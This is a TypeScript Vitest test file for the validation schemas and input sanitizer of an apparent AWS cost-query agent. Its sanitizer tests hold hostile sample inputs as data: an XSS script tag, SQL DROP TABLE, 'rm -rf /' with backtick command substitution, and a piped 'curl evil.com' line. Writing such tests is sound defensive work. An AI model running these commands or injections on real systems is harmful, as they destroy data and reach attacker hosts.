import { describe, it, expect } from 'vitest';
import {
  CostQuerySchema,
  AgentQuerySchema,
  ScanInitiateSchema,
  ApprovalResponseSchema,
  sanitizeInput,
  validateAndParse,
} from './validation.js';

describe('CostQuerySchema', () => {
  it('validates a complete valid cost query', () => {
    const data = {
      startDate: '2024-01-01',
      endDate: '2024-01-31',
      granularity: 'DAILY',
      region: 'us-east-1',
      service: 'Amazon EC2',
    };
    const result = validateAndParse(CostQuerySchema, data);
    expect(result.startDate).toBe('2024-01-01');
    expect(result.granularity).toBe('DAILY');
  });

  it('applies default granularity of MONTHLY', () => {
    const data = { startDate: '2024-01-01', endDate: '2024-01-31' };
    const result = validateAndParse(CostQuerySchema, data);
    expect(result.granularity).toBe('MONTHLY');
  });

  it('rejects invalid date format', () => {
    const data = { startDate: '01-01-2024', endDate: '2024-01-31' };
    expect(() => validateAndParse(CostQuerySchema, data)).toThrow();
  });

  it('rejects invalid region format', () => {
    const data = { startDate: '2024-01-01', endDate: '2024-01-31', region: 'invalid' };
    expect(() => validateAndParse(CostQuerySchema, data)).toThrow();
  });

  it('rejects service longer than 100 characters', () => {
    const data = {
      startDate: '2024-01-01',
      endDate: '2024-01-31',
      service: 'x'.repeat(101),
    };
    expect(() => validateAndParse(CostQuerySchema, data)).toThrow();
  });

  it('allows optional region and service to be omitted', () => {
    const data = { startDate: '2024-01-01', endDate: '2024-12-31' };
    const result = validateAndParse(CostQuerySchema, data);
    expect(result.region).toBeUndefined();
    expect(result.service).toBeUndefined();
  });
});

describe('AgentQuerySchema', () => {
  it('validates a valid message', () => {
    const data = { message: 'What are my top costs?' };
    const result = validateAndParse(AgentQuerySchema, data);
    expect(result.message).toBe('What are my top costs?');
  });

  it('trims whitespace from message', () => {
    const data = { message: '  hello world  ' };
    const result = validateAndParse(AgentQuerySchema, data);
    expect(result.message).toBe('hello world');
  });

  it('rejects empty message', () => {
    const data = { message: '' };
    expect(() => validateAndParse(AgentQuerySchema, data)).toThrow();
  });

  it('rejects message exceeding 2000 characters', () => {
    const data = { message: 'a'.repeat(2001) };
    expect(() => validateAndParse(AgentQuerySchema, data)).toThrow();
  });
});

describe('ScanInitiateSchema', () => {
  it('validates an empty object', () => {
    const result = validateAndParse(ScanInitiateSchema, {});
    expect(result).toEqual({});
  });
});

describe('ApprovalResponseSchema', () => {
  it('validates a valid approval response', () => {
    const data = {
      approvalId: '550e8400-e29b-41d4-a716-446655440000',
      decision: 'approved',
    };
    const result = validateAndParse(ApprovalResponseSchema, data);
    expect(result.decision).toBe('approved');
  });

  it('validates a rejection response', () => {
    const data = {
      approvalId: '550e8400-e29b-41d4-a716-446655440000',
      decision: 'rejected',
    };
    const result = validateAndParse(ApprovalResponseSchema, data);
    expect(result.decision).toBe('rejected');
  });

  it('rejects invalid UUID', () => {
    const data = { approvalId: 'not-a-uuid', decision: 'approved' };
    expect(() => validateAndParse(ApprovalResponseSchema, data)).toThrow();
  });

  it('rejects invalid decision value', () => {
    const data = {
      approvalId: '550e8400-e29b-41d4-a716-446655440000',
      decision: 'maybe',
    };
    expect(() => validateAndParse(ApprovalResponseSchema, data)).toThrow();
  });
});

describe('sanitizeInput', () => {
  it('removes script tags', () => {
    const input = 'hello <script>alert("xss")</script> world';
    const result = sanitizeInput(input);
    expect(result).not.toContain('<script>');
    expect(result).not.toContain('alert');
    expect(result).toContain('hello');
    expect(result).toContain('world');
  });

  it('removes SQL injection patterns', () => {
    const input = 'SELECT * FROM users; DROP TABLE users;';
    const result = sanitizeInput(input);
    expect(result).not.toContain('DROP TABLE');
  });

  it('removes DELETE FROM pattern', () => {
    const input = 'DELETE FROM resources WHERE id = 1';
    const result = sanitizeInput(input);
    expect(result).not.toContain('DELETE FROM');
  });

  it('removes shell metacharacters', () => {
    const input = 'ls; rm -rf /; echo `whoami`';
    const result = sanitizeInput(input);
    expect(result).not.toContain(';');
    expect(result).not.toContain('`');
  });

  it('removes pipe and ampersand characters', () => {
    const input = 'cat file | grep secret && curl evil.com';
    const result = sanitizeInput(input);
    expect(result).not.toContain('|');
    expect(result).not.toContain('&&');
  });

  it('limits output to 2000 characters', () => {
    const input = 'a'.repeat(3000);
    const result = sanitizeInput(input);
    expect(result.length).toBeLessThanOrEqual(2000);
  });

  it('preserves safe input unchanged', () => {
    const input = 'What are my EC2 costs in us-east-1?';
    const result = sanitizeInput(input);
    expect(result).toBe('What are my EC2 costs in us-east-1?');
  });

  it('trims whitespace from result', () => {
    const input = '  hello world  ';
    const result = sanitizeInput(input);
    expect(result).toBe('hello world');
  });
});

describe('validateAndParse', () => {
  it('throws ApiError with status 400 on validation failure', () => {
    try {
      validateAndParse(AgentQuerySchema, { message: '' });
    } catch (error: any) {
      expect(error.statusCode).toBe(400);
      expect(error.message).toBe('Validation failed');
      expect(error.details).toBeDefined();
      expect(error.details.errors).toBeInstanceOf(Array);
    }
  });

  it('includes field path in error details', () => {
    try {
      validateAndParse(CostQuerySchema, { startDate: 'bad', endDate: '2024-01-01' });
    } catch (error: any) {
      const errors = error.details.errors;
      expect(errors.some((e: any) => e.path === 'startDate')).toBe(true);
    }
  });
});
